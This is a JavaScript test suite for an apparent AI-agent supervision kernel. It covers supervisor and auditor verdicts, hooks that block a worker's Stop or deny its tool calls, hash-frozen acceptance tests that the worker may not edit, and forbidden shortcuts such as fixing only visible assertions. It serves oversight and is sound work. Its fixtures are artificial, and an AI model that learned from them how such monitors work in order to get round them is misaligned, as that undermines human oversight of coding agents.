      assert.match(packet.rejectedClearance.auditErrors.join(" "), /red acceptance/);
      return { ok: true, verdict: {
        onTrack: false,
        drift: "the integrated module still exports the pre-contract value",
        plan: ["set src/value.js to the frozen value", "rerun frozen acceptance"],
        expectedNextActions: ["edit:src/value.js", "run:acceptance"],
        acceptanceRisk: "controller-owned integration acceptance is red",
      } };
    },
    clearanceAuditorHandler: () => ({ ok: true, verdict: {
      passed: true, errors: [], verifiedFacts: ["the proposed clearance is syntactically clean"],
      notes: [],
    } }),
    correctionAuditorHandler: ({ evidence }) => {
      assert.match(evidence.trigger, /^clearance-rejected:multi-agent-integration:/);
      return { ok: true, verdict: {
        passed: true, errors: [], verifiedFacts: ["the repair targets the red integration result"],
      } };
    },
  });

  const supervised = h.controller.supervise({
    input: { hook_event_name: "TaskCompleted", task_id: "integration" },
    agent: "claude-code",
    boundary: "TaskCompleted",
    trigger: "multi-agent-integration:conflict-free",
    acceptanceResult: red,
    semanticOutcome: null,
    actor: { agentId: "main", task: { id: "integration", owner: "lead" } },
  });

  const events = h.store.events();
  assert.equal(supervised.status, "correction", JSON.stringify({ supervised,
    events: events.slice(-12).map((event) => ({ type: event.type, error: event.error,
      passed: event.passed, source: event.source })) }));
  const clearance = events.find((event) => event.type === "supervisor_clearance_audit");
  assert.equal(clearance.auditorPassed, null);
  assert.equal(clearance.auditSource, "deterministic-controller-contradiction");
  assert.equal(clearance.passed, false);
  assert.equal(clearance.internallyConsistent, false);
  assert.ok(events.some((event) => event.type === "supervisor_clearance_rejected"));
  assert.ok(events.some((event) => event.type === "supervisor_verdict"
    && event.source === "clearance-rediagnosis" && event.onTrack === false));
  assert.ok(events.some((event) => event.type === "correction_factual_audit"
    && event.passed === true));
  assert.ok(events.some((event) => event.type === "correction_emitted"
    && event.channel === "TaskCompleted.exit2"));
});

test("red acceptance rejects an empty onTrack clearance without spending an auditor call", () => {
  const red = { ran: true, passed: false, exit: 1, command: "npm test",
    output: "sealed recovery drill marker is present" };
  let supervisorCalls = 0;
  const h = harness({
    acceptanceResults: [red],
    supervisorHandler: ({ packet }) => {
      supervisorCalls += 1;
      if (supervisorCalls === 1) return { ok: true, verdict: {
        onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "none",
      } };
      assert.match(packet.trigger, /^clearance-rejected:/);
      assert.match(packet.rejectedClearance.auditErrors.join(" "), /red acceptance/);
      return { ok: true, verdict: {
        onTrack: false,
        drift: "the frozen acceptance rejects the current implementation",
        plan: ["repair src/value.js", "rerun the frozen acceptance"],
        expectedNextActions: ["edit:src/value.js", "run:acceptance"],
        acceptanceRisk: "delivery remains mechanically red until the implementation is repaired",
      } };
    },
    clearanceAuditorHandler: () => ({ ok: true, packet: { auditor: "mistaken-pass" }, verdict: {
      passed: true, errors: [], verifiedFacts: ["the proposal has no prose contradiction"],
    } }),
    correctionAuditorHandler: () => ({ ok: true, packet: { auditor: "correction-pass" }, verdict: {
      passed: true, errors: [], verifiedFacts: ["the marker is the exact failing acceptance witness"],
    } }),
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  assert.match(stopped.output.reason, /OUTSIDER_INTERVENTION:/);
  const events = h.store.events();
  assert.ok(events.some((event) => event.type === "supervisor_clearance_audit"
    && event.auditorPassed === null && event.passed === false
    && event.internallyConsistent === false
    && event.errors.some((error) => /red acceptance/.test(error))));
  assert.equal(events.filter((event) =>
    event.type === "supervisor_clearance_auditor_requested").length, 0);
  assert.ok(events.some((event) => event.type === "supervisor_clearance_rejected"
    && event.reason === "objective-contradiction"));
  assert.ok(events.some((event) => event.type === "correction_emitted"
    && event.source === "supervisor_plan"));
});

test("red acceptance re-diagnoses without depending on clearance auditor availability", () => {
  const red = { ran: true, passed: false, exit: 1, command: "npm test",
    output: "sealed recovery drill marker is present" };
  let supervisorCalls = 0;
  const h = harness({
    acceptanceResults: [red],
    supervisorHandler: ({ packet }) => {
      supervisorCalls += 1;
      if (supervisorCalls === 1) return { ok: true, verdict: {
        onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "none",
      } };
      assert.match(packet.trigger, /^clearance-rejected:/);
      assert.match(packet.rejectedClearance.auditErrors.join(" "), /red acceptance/);
      return { ok: true, verdict: {
        onTrack: false,
        drift: "src/value.js leaves the evaluator-owned recovery failure unresolved",
        plan: ["repair src/value.js", "rerun the frozen acceptance"],
        expectedNextActions: ["edit:src/value.js", "run:acceptance"],
        acceptanceRisk: "delivery remains red until src/value.js handles the recovery case",
      } };
    },
    clearanceAuditorHandler: () => ({ ok: false, error: "INVALID_JSON_RESPONSE",
      failure: { kind: "schema-invalid", retryable: true,
        retryInstruction: "return one valid semantic audit object" } }),
    correctionAuditorHandler: () => ({ ok: true, packet: { auditor: "correction-pass" }, verdict: {
      passed: true, errors: [], verifiedFacts: ["the marker is the exact failing witness"],
    } }),
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  assert.match(stopped.output.reason, /OUTSIDER_INTERVENTION:/);
  const events = h.store.events();
  assert.equal(events.filter((event) =>
    event.type === "supervisor_clearance_auditor_requested").length, 0);
  assert.equal(events.filter((event) =>
    event.type === "supervisor_clearance_auditor_failed").length, 0);
  assert.ok(events.some((event) => event.type === "supervisor_clearance_deterministically_rejected"
    && event.reason === "controller-owned-objective-contradiction"
    && event.errors.some((error) => /red acceptance/.test(error))));
  assert.ok(events.some((event) => event.type === "supervisor_verdict"
    && event.source === "clearance-rediagnosis" && event.onTrack === false));
  assert.ok(events.some((event) => event.type === "correction_factual_audit" && event.passed));
  assert.ok(events.some((event) => event.type === "correction_emitted"));
});

test("a semantic verdict first obtained after worker exit cannot masquerade as Stop control", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" };
  const h = harness({ acceptanceResults: [green] });
  const finished = h.controller.finish();
  assert.equal(finished.acceptance.passed, true);
  assert.equal(finished.proof.complete, false);
  assert.match(finished.proof.errors.join(" "), /semantic outcome verification/);
  assert.ok(h.store.events().some((event) => event.type === "outcome_verdict"
    && event.phase === "final-fallback"));
});

test("semantic contract is compiled before the worker and rejects literal-only completion", () => {
  const baseline = { fingerprint: "sha256:x", nFiles: 1,
    files: { "README.md": { text: "The limiter must use a rolling window." } } };
  let sent = "";
  const result = compileSemanticContract({
    cmd: "fake",
    ask: "修好限流器",
    acceptance: "npm test",
    baseline,
    execute: ({ input }) => {
      sent = input;
      return { ok: true, value: {
        objective: "保证任意连续窗口内的请求上限",
        successCriteria: ["边界跨桶时仍满足滚动窗口语义"],
        architecturalConstraints: ["保持公开 API"],
        forbiddenShortcuts: ["不能只修可见断言或保留 fixed-window 机制"],
        scope: { in: ["limiter"], out: [] },
        uncertainties: [],
      } };
    },
  });
  assert.equal(result.ok, true);
  assert.match(result.semantic.forbiddenShortcuts[0], /fixed-window/);
  assert.match(sent, /rolling window/);
  assert.doesNotMatch(sent, /workerNarration|self.?evaluation/i);
});

test("the contract auditor rejects a current-now tail rule that narrows an operator's global invariant", () => {
  const semantic = {
    objective: "limit requests only in the interval ending at the current now",
    successCriteria: ["count accepted timestamps in (now-windowMs, now] for this call"],
    architecturalConstraints: ["store accepted timestamps"],
    forbiddenShortcuts: [], scope: { in: ["src/limiter.js"], out: [] }, uncertainties: [],
  };
  let sent = "";
  const result = auditSemanticContract({
    cmd: "fake",
    ask: "任意连续 windowMs 时间内最多接受 limit 个请求；now 可能非单调",
    acceptance: "npm test && node sealed.mjs",
    baseline: { fingerprint: "f", nFiles: 1, files: {} },
    baselineAcceptance: { ran: true, passed: false, exit: 1,
      output: "accepting 50 would leave three accepted timestamps inside (-900,100]" },
    semantic,
    execute: ({ input }) => {
      sent = input;
      return { ok: true, value: {
        passed: false,
        errors: ["the draft narrows any continuous window to only the interval ending at the current call"],
        verifiedFacts: ["a later accepted timestamp can participate in the violating global window after now moves backward"],
      } };
    },
  });
  assert.equal(result.ok, true);
  assert.equal(result.verdict.passed, false);
  assert.match(sent, /任意连续 windowMs/);
  assert.match(sent, /current now|当前\/本次/);
  assert.match(sent, /accepting 50/);
});

test("contract compilation retries a transient fresh-session failure but not forever", () => {
  const baseline = { fingerprint: "f", nFiles: 0, files: {} };
  let calls = 0;
  const result = compileSemanticContract({
    cmd: "fake",
    ask: "deliver the mechanism",
    acceptance: "npm test",
    baseline,
    execute: () => {
      calls += 1;
      if (calls === 1) return { ok: false, error: "Execution error",
        failure: { kind: "process", status: 1, retryable: true } };
      return { ok: true, value: {
        objective: "deliver the mechanism",
        successCriteria: ["mechanism works"], architecturalConstraints: [],
        forbiddenShortcuts: [], scope: { in: [], out: [] }, uncertainties: [],
      } };
    },
  });
  assert.equal(result.ok, true);
  assert.equal(result.attempts, 2);
  assert.equal(calls, 2);
});

test("contract compilation and audit carry typed JSON repair feedback into their one retry", () => {
  const baseline = { fingerprint: "f", nFiles: 0, files: {} };
  const semantic = {
    objective: "deliver the mechanism", successCriteria: ["mechanism works"],
    architecturalConstraints: [], forbiddenShortcuts: [],
    scope: { in: [], out: [] }, uncertainties: [],
  };
  const compileInputs = [];
  const compiled = compileSemanticContract({
    cmd: "fake", ask: "deliver the mechanism", acceptance: "npm test", baseline,
    execute: ({ input }) => {
      compileInputs.push(input);
      if (compileInputs.length === 1) return { ok: false, error: "INVALID_JSON_RESPONSE",
        retryInput: `${input}\nJSON REPAIR REQUIRED\nReturn exactly one JSON object.`,
        failure: { kind: "invalid-json", retryable: true,
          retryInstruction: "Return exactly one JSON object." } };
      return { ok: true, value: semantic };
    },
  });
  assert.equal(compiled.ok, true);
  assert.equal(compileInputs.length, 2);
  assert.match(compileInputs[1], /JSON REPAIR REQUIRED/);

  const auditInputs = [];
  const audited = auditSemanticContract({
    cmd: "fake", ask: "deliver the mechanism", acceptance: "npm test", baseline, semantic,
    execute: ({ input }) => {
      auditInputs.push(input);
      if (auditInputs.length === 1) return { ok: false, error: "SCHEMA_INVALID_RESPONSE",
        retryInput: `${input}\nSCHEMA REPAIR REQUIRED\nReturn passed/errors/verifiedFacts.`,
        failure: { kind: "schema-invalid", retryable: true,
          retryInstruction: "Return passed/errors/verifiedFacts." } };
      return { ok: true, value: { passed: true, errors: [],
        verifiedFacts: ["operator meaning preserved"] } };
    },
  });
  assert.equal(audited.ok, true);
  assert.equal(auditInputs.length, 2);
  assert.match(auditInputs[1], /SCHEMA REPAIR REQUIRED/);
});

test("contract compilation sees frozen executable assertions and baseline failures", () => {
  const baseline = { fingerprint: "frozen", nFiles: 3, files: {
    "src/limiter.js": { text: "export function allow() {}", sha: "source" },
    "test/limiter.test.js": { text: "// exact rolling invariant\nassert.equal(allow(1001), false);", sha: "test" },
    "package.json": { text: JSON.stringify({ scripts: { test: "node --test test/*.test.js" } }), sha: "pkg" },
  } };
  let sent = "";
  const result = compileSemanticContract({
    cmd: "fake",
    ask: "implement the exact rolling limiter",
    acceptance: "npm test",
    baseline,
    baselineAcceptance: { ran: true, passed: false, exit: 1,
      command: "npm test", output: "expected false, received true" },
    execute: ({ input }) => {
      sent = input;
      return { ok: true, value: {
        objective: "preserve the exact rolling invariant",
        successCriteria: ["every rolling interval respects the limit"],
        architecturalConstraints: [], forbiddenShortcuts: ["no approximate substitute"],
        scope: { in: ["src/limiter.js"], out: [] }, uncertainties: [],
      } };
    },
  });
  assert.equal(result.ok, true);
  assert.match(sent, /exact rolling invariant/);
  assert.match(sent, /assert\.equal\(allow\(1001\), false\)/);
  assert.match(sent, /expected false, received true/);
  assert.match(sent, /sha256/);
});

test("frozen acceptance prioritizes the test named by the operator in a large suite", () => {
  const files = { "package.json": { text: "{}", sha: "pkg" } };
  for (let index = 0; index < 20; index += 1) {
    files[`test/a-${String(index).padStart(2, "0")}.test.js`] = {
      text: `assert.equal(${index}, ${index});`, sha: `sha-${index}`,
    };
  }
  files["test/z-limiter.test.js"] = {
    text: "// exact invariant that must not fall outside the packet", sha: "target",
  };
  const packet = contractCompilerPacket({
    ask: "fix test/z-limiter.test.js without weakening its exact invariant",
    acceptance: "npm test",
    baseline: { fingerprint: "f", nFiles: 22, files },
  });
  assert.ok(packet.frozenAcceptanceDefinition.files.some((file) =>
    file.path === "test/z-limiter.test.js" && file.sha256 === "target"));
  assert.ok(packet.frozenAcceptanceDefinition.files.every((file) =>
    file.status === "unchanged" && file.currentSha256 === file.sha256 && file.changed === false),
  "pre-worker contract audit compares frozen acceptance hashes to the same t=0 baseline");
});

test("frozen acceptance keeps a complete hash-only boundary for named protocol controls", () => {
  const sha = (digit) => `sha256:${digit.repeat(64)}`;
  const snapshot = { fingerprint: "frozen-controls", files: {
    "src/index.js": { text: "export const value = 1;", sha: sha("1") },
    "test.mjs": { text: "assert.equal(value, 1);", sha: sha("2") },
    "checkpoint.mjs": { text: "console.log('checkpoint');", sha: sha("3") },
    "ENDURANCE-PROTOCOL.md": { text: "# frozen protocol", sha: sha("4") },
    "package.json": { text: "{}", sha: sha("5") },
  } };
  const contract = { ask: "Repair src/index.js only. Do not edit tests, protocol, checkpoint, or package files.",
    acceptance: "npm test", semantic: { successCriteria: [], architecturalConstraints: [],
      forbiddenShortcuts: [], scope: { in: ["src/index.js"], out: [] } } };
  const frozen = frozenAcceptanceEvidence(snapshot, contract, { currentSnapshot: snapshot });
  assert.deepEqual(frozen.protectedPaths.map((item) => item.path), [
    "checkpoint.mjs", "ENDURANCE-PROTOCOL.md", "package.json", "test.mjs",
  ]);
  assert.equal(frozen.protectedPaths.every((item) => item.status === "unchanged"
    && item.currentSha256 === item.sha256 && item.changed === false), true);
  assert.equal(frozen.files.some((item) => item.path === "checkpoint.mjs"), false,
    "hash-only protection does not spend the executable evidence body budget");
  assert.equal(frozen.files.some((item) => item.path === "ENDURANCE-PROTOCOL.md"), false);

  const evidence = { frozenAcceptanceDefinition: frozen,
    currentSourceEvidence: [{ path: "src/index.js", sha256: sha("1") }],
    semanticOutcome: { passed: false, gaps: ["src/index.js returns the wrong value"] } };
  const authority = correctionAuthorityFrom({ contract, cwd: "/repo", evidence, verdict: {
    onTrack: false, drift: "wrong value", plan: ["repair src/index.js"],
    expectedNextActions: ["edit:src/index.js", "run:acceptance"],
  } });
  assert.equal(validCorrectionAuthority(authority), true);
  assert.deepEqual(authority.protectedPaths.map((item) => item.path),
    frozen.protectedPaths.map((item) => item.path));

  const protectedEdit = correctionAuthorityFrom({ contract, cwd: "/repo", evidence, verdict: {
    onTrack: false, drift: "wrong value", plan: ["repair test"],
    expectedNextActions: ["edit:checkpoint.mjs", "run:acceptance"],
  } });
  assert.equal(protectedEdit, null, "a protected control cannot receive edit authority");
});

test("a truncated protected-path set fails closed before correction authority", () => {
  const files = {};
  for (let index = 0; index < 5; index += 1) {
    files[`test/case-${index}.test.js`] = {
      text: `assert.equal(${index}, ${index});`,
      sha: `sha256:${String(index + 1).repeat(64)}`,
    };
  }
  files["src/index.js"] = { text: "export const value = 1;", sha: `sha256:${"a".repeat(64)}` };
  const contract = { ask: "Do not edit tests.", acceptance: "npm test",
    semantic: { scope: { in: ["src/index.js"], out: [] } } };
  const frozen = frozenAcceptanceEvidence({ fingerprint: "f", files }, contract,
    { currentSnapshot: { fingerprint: "f", files }, maxProtectedPaths: 2 });
  assert.equal(frozen.protectedPathsTruncated, true);
  assert.equal(correctionAuthorityFrom({ contract, cwd: "/repo", evidence: {
    frozenAcceptanceDefinition: frozen,
    currentSourceEvidence: [{ path: "src/index.js", sha256: `sha256:${"a".repeat(64)}` }],
  }, verdict: { onTrack: false, drift: "wrong", plan: ["repair src/index.js"],
    expectedNextActions: ["edit:src/index.js", "run:acceptance"] } }), null);
});

test("contract compilation receives root test runners and operator-named source without tools", () => {
  const files = {
    "package.json": { text: JSON.stringify({ scripts: { test: "node test.mjs" } }), sha: "pkg" },
    "test.mjs": { text: "assert.equal(createLimiter().allow(1), false);", sha: "test" },
    "src/limiter.js": { text: "export const createLimiter = () => ({ allow: () => true });", sha: "src" },
    "src/unrelated.js": { text: "export const unrelated = true;", sha: "other" },
  };
  const packet = contractCompilerPacket({
    ask: "复核 src/limiter.js 是否满足精确窗口语义",
    acceptance: "npm test",
    baseline: { fingerprint: "f", nFiles: 4, files },
  });
  assert.ok(packet.frozenAcceptanceDefinition.files.some((file) =>
    file.path === "test.mjs" && file.content.includes("assert.equal")));
  assert.ok(packet.baseline.selectedContext.some((file) =>
    file.path === "src/limiter.js" && file.content.includes("createLimiter")
      && file.sha256 === "src" && file.status === "frozen-baseline"));
  assert.ok(packet.baseline.selectedContext.some((file) => file.path === "test.mjs"),
    "the npm test script expansion selects the executable root test too");
  assert.equal(packet.baseline.selectedContext.some((file) => file.path === "src/unrelated.js"), false);
});

test("contract compilation failure happens before the worker exists", async () => {
  const { cwd, stateRoot } = workspace();
  let workerStarts = 0;
  await assert.rejects(startKernelRun({
    cwd,
    ask: "实现真正的滑动窗口，不要只补断言",
    acceptance: "npm test",
    supervisorCommand: "fake-supervisor",
    hookEntry: path.resolve("bin/outsider-hook.mjs"),
    stateRoot,
    workerPreflight: () => ({ ok: true }),
    contractCompiler: () => ({ ok: false, error: "ambiguous contract" }),
    spawnWorker: () => { workerStarts += 1; throw new Error("must not start"); },
  }), /CONTRACT_COMPILATION_FAILED:ambiguous contract/);
  assert.equal(workerStarts, 0);
});

test("an unavailable semantic control plane fails before any worker exists", async () => {
  for (const failure of ["red-verifier", "green-verifier", "pass-auditor"]) {
    const { cwd, stateRoot } = workspace();
    let workerStarts = 0;
    await assert.rejects(startKernelRun({
      cwd,
      ask: "review the already-green implementation",
      acceptance: "npm test",
      supervisorCommand: "fake-supervisor",
      hookEntry: path.resolve("bin/outsider-hook.mjs"),
      stateRoot,
      workerPreflight: () => ({ ok: true }),
      acceptancePreflight: ({ command }) => ({ ran: true,
        passed: failure !== "red-verifier", exit: failure === "red-verifier" ? 1 : 0,
        command, output: failure === "red-verifier" ? "red" : "green" }),
      losslessContract: true,
      baselineVerifier: () => failure.endsWith("verifier")
        ? { ok: false, error: "session limit" }
        : { ok: true, packet: {}, verdict: {
          passed: true, gaps: [], evidence: ["source reviewed"], insufficient: null,
        } },
      baselineOutcomeAuditor: () => ({ ok: false, error: "auditor transport unavailable" }),
      spawnWorker: () => { workerStarts += 1; throw new Error("must not start"); },
    }), /SEMANTIC_CONTROL_PREFLIGHT_FAILED/);
    assert.equal(workerStarts, 0, failure);
  }
});

test("pre-worker outcome judges receive one bounded typed repair retry", async () => {
  const { cwd, stateRoot } = workspace();
  let verifierCalls = 0;
  let auditorCalls = 0;
  let run = null;
  try {
    run = await startKernelRun({
      cwd, ask: "review the implementation", acceptance: "npm test",
      supervisorCommand: "fake-supervisor", hookEntry: path.resolve("bin/outsider-hook.mjs"),
      stateRoot,
      workerPreflight: () => ({ ok: true }), losslessContract: true,
      baselineVerifier: ({ validationFeedback }) => {
        verifierCalls += 1;
        if (verifierCalls === 1) return { ok: false, error: "INVALID_JSON_RESPONSE",
          failure: { retryable: true, retryInstruction: "return verdict JSON only" } };
        assert.match(validationFeedback, /verdict JSON only/);
        return { ok: true, packet: {}, verdict: { passed: true, gaps: [],
          evidence: ["source reviewed"], insufficient: null } };
      },
      baselineOutcomeAuditor: ({ validationFeedback }) => {
        auditorCalls += 1;
        if (auditorCalls === 1) return { ok: false, error: "SCHEMA_INVALID_RESPONSE",
          failure: { retryable: true, retryInstruction: "return audit JSON only" } };
        assert.match(validationFeedback, /audit JSON only/);
        return { ok: true, packet: {}, verdict: { passed: true, errors: [],
          verifiedFacts: ["baseline independently reviewed"] } };
      },
      spawnWorker: () => ({ pid: 4242, stdout: null, stderr: null, kill: () => true }),
    });
    assert.equal(verifierCalls, 2);
    assert.equal(auditorCalls, 2);
  } finally {
    await run?.watchdog.close().catch(() => undefined);
  }
});

test("a twice-rejected semantic paraphrase falls back to the sealed operator words", async () => {
  const { cwd, stateRoot } = workspace();
  let compilerCalls = 0;
  let auditorCalls = 0;
  let workerStarts = 0;
  let run = null;
  try {
    run = await startKernelRun({
    cwd,
    ask: "任意连续 windowMs 时间内最多接受 limit 个请求；now 可能非单调",
    acceptance: "npm test",
    supervisorCommand: "fake-supervisor",
    hookEntry: path.resolve("bin/outsider-hook.mjs"),
    stateRoot,
    workerPreflight: () => ({ ok: true }),
    acceptancePreflight: ({ command }) => ({ ran: true, passed: false, exit: 1,
      command, output: "global-window counterexample failed" }),
    contractCompiler: (options) => {
      compilerCalls += 1;
      if (compilerCalls === 2) {
        assert.match(options.revision.auditErrors.join(" "), /narrows the global invariant/);
        assert.ok(options.revision.rejectedDraft);
      }
      return { ok: true, semantic: {
        objective: "check only the interval ending at current now",
        successCriteria: ["count (now-windowMs, now]"],
        architecturalConstraints: [], forbiddenShortcuts: [],
        scope: { in: ["src"], out: [] }, uncertainties: [],
      } };
    },
    contractAuditor: () => {
      auditorCalls += 1;
      return { ok: true, verdict: {
        passed: false,
        errors: ["the draft narrows the global invariant to the current call"],
        verifiedFacts: ["operator said any continuous interval"],
      } };
    },
      baselineVerifier: () => ({ ok: true, packet: { phase: "baseline" }, verdict: {
        passed: false, gaps: ["baseline acceptance is red"],
        evidence: ["frozen acceptance exit is nonzero"], insufficient: null,
      } }),
      spawnWorker: () => { workerStarts += 1; return { pid: 4242, stdout: null, stderr: null,
        kill: () => true }; },
    });
    assert.equal(compilerCalls, 2);
    assert.equal(auditorCalls, 2);
    assert.equal(workerStarts, 1);
    assert.equal(run.contract.semantic.objective,
      "任意连续 windowMs 时间内最多接受 limit 个请求；now 可能非单调");
    assert.ok(run.contract.semantic.successCriteria.includes(run.contract.ask));
    assert.equal(run.contract.semanticAudit.mode, "lossless-operator-fallback");
    assert.ok(run.store.events().some((event) => event.type === "contract_fallback_used"
      && event.rejectedDrafts === 2));
    const audited = run.store.events().find((event) => event.type === "contract_audited");
    assert.equal(audited.source, "deterministic-operator-identity");
  } finally {
    await run?.watchdog.close().catch(() => undefined);
  }
});

test("contract evidence marked insufficient still prevents a worker from starting", async () => {
  const { cwd, stateRoot } = workspace();
  let workerStarts = 0;
  await assert.rejects(startKernelRun({
    cwd,
    ask: "implement the unspecified policy",
    acceptance: "npm test",
    supervisorCommand: "fake-supervisor",
    hookEntry: path.resolve("bin/outsider-hook.mjs"),
    stateRoot,
    workerPreflight: () => ({ ok: true }),
    acceptancePreflight: ({ command }) => ({ ran: true, passed: false, exit: 1,
      command, output: "red" }),
    contractCompiler: () => ({ ok: true, semantic: {
      objective: "guess a policy", successCriteria: ["guess"], architecturalConstraints: [],
      forbiddenShortcuts: [], scope: { in: [], out: [] }, uncertainties: [],
    } }),
    contractAuditor: () => ({ ok: true, verdict: {
      passed: false, errors: [], verifiedFacts: [],
      insufficient: "operator did not define which policy applies",
    } }),
    spawnWorker: () => { workerStarts += 1; throw new Error("must not start"); },
  }), /CONTRACT_AUDIT_REJECTED/);
  assert.equal(workerStarts, 0);
});

test("a mutating or unavailable acceptance command cannot become the standard", async () => {
  const first = workspace();
  let compilerCalls = 0;
  await assert.rejects(startKernelRun({
    cwd: first.cwd,
    stateRoot: first.stateRoot,
    ask: "make value correct",
    acceptance: "bad-test",
    supervisorCommand: "fake-supervisor",
    hookEntry: path.resolve("bin/outsider-hook.mjs"),
    workerPreflight: () => ({ ok: true }),
    acceptancePreflight: () => ({ ran: true, passed: false, exit: 127,
      command: "bad-test", output: "bad-test: command not found" }),
    contractCompiler: () => { compilerCalls += 1; return { ok: false }; },
  }), /ACCEPTANCE_PREFLIGHT_FAILED:acceptance command unavailable \(exit 127\): bad-test: command not found/);
  assert.equal(compilerCalls, 0, "no model contract call occurs for an unusable command");

  const second = workspace();
  await assert.rejects(startKernelRun({
    cwd: second.cwd,
    stateRoot: second.stateRoot,
    ask: "make value correct",
    acceptance: "mutating-test",
    supervisorCommand: "fake-supervisor",
    hookEntry: path.resolve("bin/outsider-hook.mjs"),
    workerPreflight: () => ({ ok: true }),
    acceptancePreflight: () => {
      writeFileSync(path.join(second.cwd, "src", "value.js"), "export const value = 999;\n");
      return { ran: true, passed: true, exit: 0, command: "mutating-test", output: "ok" };
    },
    contractCompiler: () => { compilerCalls += 1; return { ok: false }; },
  }), /ACCEPTANCE_PREFLIGHT_MUTATED_WORKSPACE:src\/value\.js/);
  assert.equal(compilerCalls, 0);
});

test("controlled settings install every lifecycle boundary used by the kernel", () => {
  const settings = controlledWorkerSettings("/tmp/path with spaces/outsider-hook.mjs");
  assert.deepEqual(Object.keys(settings.hooks).sort(), [
    "PostToolUse", "PreToolUse", "Stop", "SubagentStart", "SubagentStop",
    "TaskCompleted", "TaskCreated", "TeammateIdle",
  ]);
  for (const groups of Object.values(settings.hooks)) {
    assert.equal(Object.hasOwn(groups[0], "matcher"), false);
    assert.equal(groups[0].hooks[0].timeout, 900);
    assert.match(groups[0].hooks[0].command, /"\/tmp\/path with spaces\/outsider-hook\.mjs"/);
  }
});

test("interactive Agent Team transport uses a real PTY without pretending print mode is a team", () => {
  const plan = controlledWorkerLaunchPlan({
    executable: "/Applications/Claude/claude",
    prompt: "spawn exactly one named teammate",
    settingsPath: "/tmp/worker-settings.json",
    mandate: "frozen mandate",
    maxBudgetUsd: 12,
    workerTransport: "interactive-pty",
    ptyWrapperExecutable: "/usr/bin/expect",
    ptyWrapperScript: "/opt/outsider/pty-worker.exp",
    disallowedTools: ["Agent", "TaskCreate", "TaskUpdate"],
  });
  assert.equal(plan.executable, "/usr/bin/expect");
  assert.deepEqual(plan.args.slice(0, 2),
    ["/opt/outsider/pty-worker.exp", "/Applications/Claude/claude"]);
  assert.equal(plan.claudeArgs.includes("-p"), false);
  assert.equal(plan.claudeArgs.includes("--max-budget-usd"), false,
    "interactive Claude is time-bounded by the controller, not a print-only flag");
  assert.equal(plan.claudeArgs.at(0), "spawn exactly one named teammate");
  const disallowedAt = plan.claudeArgs.indexOf("--disallowed-tools");
  assert.equal(plan.claudeArgs[disallowedAt + 1], "Agent,TaskCreate,TaskUpdate");
  assert.equal(plan.claudeArgs.length, disallowedAt + 2,
    "the variadic tool option is last and cannot consume the positional prompt");
  assert.deepEqual(plan.stdio, ["pipe", "pipe", "pipe"]);

  const headless = controlledWorkerLaunchPlan({
    executable: "claude", prompt: "ordinary worker", settingsPath: "settings.json",
    mandate: "m", maxBudgetUsd: 3,
  });
  assert.deepEqual(headless.claudeArgs.slice(0, 2), ["-p", "ordinary worker"]);
  assert.ok(headless.claudeArgs.includes("--max-budget-usd"));
});

test("the interactive bridge allocates a controlling PTY behind Node pipes", async (t) => {
  if (!existsSync("/usr/bin/expect")) {
    t.skip("the packaged macOS Agent Team PTY bridge requires /usr/bin/expect");
    return;
  }
  const bridge = path.resolve("scripts", "outsider-pty-worker.exp");
  const child = spawn("/usr/bin/expect", [bridge, "/bin/sh", "-c",
    "test -t 0 && test -t 1 && printf PTY_OK"], {
    stdio: ["pipe", "pipe", "pipe"],
  });
  let stdout = "";
  let stderr = "";
  child.stdout.on("data", (chunk) => { stdout += chunk; });
  child.stderr.on("data", (chunk) => { stderr += chunk; });
  const exit = new Promise((resolve) => child.once("close", (code) => resolve(code)));
  setTimeout(() => child.stdin.end(), 100);
  assert.equal(await exit, 0, stderr);
  assert.match(stdout, /PTY_OK/);
});

test("owned workers cannot inherit the parent Claude session or team identity", () => {
  const isolated = isolatedWorkerEnvironment({
    PATH: "/usr/bin",
    CLAUDE_CODE_SESSION_ID: "parent-session",
    CLAUDE_CODE_PARENT_SESSION_ID: "grandparent-session",
    CLAUDE_CODE_AGENT_ID: "parent-agent",
    CLAUDE_CODE_PARENT_AGENT_ID: "lead-agent",
    CLAUDE_CODE_TEAM_NAME: "parent-team",
    CLAUDE_CODE_TEAMMATE_NAME: "parent-teammate",
    CLAUDE_CODE_TASK_LIST_ID: "parent-task-list",
    CLAUDE_CODE_INITIAL_PROMPT: "parent prompt",
    CLAUDE_CODE_PROMPT: "parent prompt 2",
    CLAUDE_CODE_OAUTH_TOKEN: "authentication-is-not-lineage",
  });
  assert.equal(isolated.PATH, "/usr/bin");
  assert.equal(isolated.CLAUDE_CODE_OAUTH_TOKEN, "authentication-is-not-lineage");
  for (const key of Object.keys(isolated)) {
    assert.equal(/CLAUDE_CODE_(?:PARENT_)?(?:SESSION|AGENT)|CLAUDE_CODE_(?:TEAM|TEAMMATE|TASK_LIST|INITIAL_PROMPT|PROMPT)/
      .test(key), false, `parent identity survived in ${key}`);
  }
});

test("a denied Agent tool call never creates a ghost delegated task", () => {
  const h = harness({
    decide: () => ({
      verdict: "warn",
      reason: "delegation is off-track",
      corrective: "repair the main path first",
      proposed: { action: "delegate", irreversible: false },
    }),
  });
  const result = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse",
    tool_name: "Agent",
    tool_use_id: "never-spawned",
    tool_input: { description: "ghost", prompt: "do work" },
    transcript_path: h.transcript,
  } });
  assert.equal(result.output.hookSpecificOutput.permissionDecision, "deny");
  assert.equal(Object.keys(h.store.readState().tasks ?? {}).length, 0);
  assert.equal(h.store.events().some((event) => event.type === "task_delegated"), false);
});

test("worker and supervisor launch surfaces are explicit and capability-checked", () => {
  const goodHelp = "--print --settings --setting-sources --append-system-prompt --permission-mode --max-budget-usd --tools --allowed-tools --strict-mcp-config";
  const loggedIn = (_executable, args) => args[0] === "--help"
    ? { status: 0, stdout: goodHelp, stderr: "" }
    : { status: 0, stdout: JSON.stringify({ loggedIn: true, authMethod: "oauth" }), stderr: "" };
  assert.deepEqual(preflightWorkerCli("fake", { run: loggedIn }),
    { ok: true });
  const missing = preflightWorkerCli("fake", { run: (_executable, args) => args[0] === "--help"
    ? { status: 0, stdout: "--print", stderr: "" }
